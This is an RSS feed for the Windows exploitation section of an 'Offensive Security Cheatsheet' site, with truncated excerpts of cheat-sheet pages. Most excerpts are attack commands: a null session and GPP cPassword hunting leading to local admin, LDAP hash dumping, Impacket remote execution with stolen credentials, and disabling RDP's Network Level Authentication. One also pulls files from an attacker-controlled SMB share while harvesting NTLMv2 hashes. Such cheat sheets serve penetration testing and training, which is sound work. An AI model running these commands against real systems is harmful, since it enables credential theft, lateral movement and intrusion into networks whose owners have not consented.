<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Exploitation on Offensive Security Cheatsheet</title>
    <link>/windows-systems/exploitation/</link>
    <description>Recent content in Exploitation on Offensive Security Cheatsheet</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    
	<atom:link href="/windows-systems/exploitation/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Exploitation Tricks</title>
      <link>/windows-systems/exploitation/exploitation_tricks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/exploitation_tricks/</guid>
      <description>From non-auth user to local admin in 3 steps # Nullsession net use \\dc\ipc$ &amp;#34;&amp;#34; /u:&amp;#34;&amp;#34; # Search for cpasswords in gpo&amp;#39;s: dir \\dc\sysvol\contoso.corp\Policies -r -I *.xml | Select-String cPassword &amp;gt;&amp;gt; dump.txt # Decrypt the cPassword gpp-decrypt &amp;lt;string&amp;gt; 
??? # STEP 1: Dump target user hash: ldapsearch –x –h &amp;lt;LDAP_IPAddr&amp;gt; -D &amp;#34;cn=Directory Manager&amp;#34; -w &amp;lt;password&amp;gt; -b &amp;#39;uid=&amp;lt;target_username&amp;gt;,cn=users,cn=accounts,dc=&amp;lt;DOMAIN&amp;gt;,dc=COM&amp;#39; uid userpassword krbprincipalkey sambalmpassword sambantpassword # STEP 2: The ‘userpassword::’ and ‘krbprincipalkey::’ hash is base64 encoded and now you need to decode it: echo &amp;#39;e1NTSEF9dHZEaUZ4ejJTUkRBLzh1NUZSSGVIT2N4WkZMci9OYktQNHNLNWc9PQ==&amp;#39; | base64 --decode {SSHA}tvDiFxz2SRDA/8u5FRHeHOcxZFLr/NbKP4sK5g== # STEP 3: Place your decoded hash into hash.</description>
    </item>
    
    <item>
      <title>Remote Execution Techniques</title>
      <link>/windows-systems/exploitation/remote_execution_techniques/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/remote_execution_techniques/</guid>
      <description>Impacket tools https://www.secureauth.com/labs/open-source-tools/impacket# psexec # PSEXEC like functionality example using RemComSvc(https://github.com/kavika13/RemCom). psexec.py domain/user:password@IP &amp;lt;command&amp;gt;# smbexec # A similar approach to PSEXEC w/o using RemComSvc. The technique is described here. # Instantiating a local smbserver to receive the output of the commands. # This is useful in the situation where the target machine does NOT have a writeable share available. smbexec.py domain/user:password@IP &amp;lt;command&amp;gt;# atexec # This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.</description>
    </item>
    
    <item>
      <title>CrackMapExec</title>
      <link>/windows-systems/exploitation/crackmapexec/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/crackmapexec/</guid>
      <description>TODO</description>
    </item>
    
    <item>
      <title>Impacket</title>
      <link>/windows-systems/exploitation/impacket/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/impacket/</guid>
      <description>TODO</description>
    </item>
    
    <item>
      <title>Kerberos</title>
      <link>/windows-systems/exploitation/kerberos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/kerberos/</guid>
      <description>General &amp;amp; Theory # Kerberos is just SSO, it&amp;#39;s like SAML or OpenID. # Authentication to a trusted source (KDC) # KDC delegates access # KDC = Key Distribution Center # AS = Authentication Service # TGT= Ticket Granting Ticket # TGS = Ticket Graning Service # In network, protocol used is KRB5 # TGS are for resources, not hosts # Authentication Process # - Authenticate to AS with a password → Get a TGT # - Request access to resource from TGS → Show TGT # - Valid TGT → Get TGS # - Show TGS to resource → resource accepts TGS → Log in # Each resource can check for valid TGS → Privileged Attribute Certificate (PAC) → Addition to Kerberos # NTLM Authentication # - chall/response using NT hash # - NTLMSSP # Communication with DC over NetLogon (RPC)</description>
    </item>
    
    <item>
      <title>RDP Exploitation</title>
      <link>/windows-systems/exploitation/rdp_exploitation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/rdp_exploitation/</guid>
      <description>Remote and Auto # Remotely enable RDP using CrackMapExec sudo crackmapexec smb 10.69.88.23 -u user -p password -M rdp -o ACTION=enable 
cmd.exe # Enable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f # Disable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;#34; /v fDenyTSConnections /t REG_DWORD /d 1 /f # Disable NLA (Network Layer Authentication) requirement reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34; /v UserAuthentication /t REG_DWORD /d 0 /f # You can also do it through the firewall netsh firewall set service remoteadmin enable netsh firewall set service remotedesktop enable</description>
    </item>
    
    <item>
      <title>File Transfer</title>
      <link>/windows-systems/exploitation/file_transfer/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/file_transfer/</guid>
      <description>/etc/init.d/pure-ftpd 
SMB Server setup # Set up a SMB server using smbserver.py from impacket smbserver.py SHARE_NAME path/to/share # From target Windows: net view \\KALI_IP (Should display the SHARE_NAME) dir \\KALI_IP\SHARE_NAME copy \\KALI_IP\SHARE_NAME\file.exe . # Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user # can be usefull to PTH, or crack passwords 
Build a FTP and transfer file # Set up a ftp downloading script on the target machine: echo open IP 21 &amp;gt; ftp.</description>
    </item>
    
  </channel>
</rss>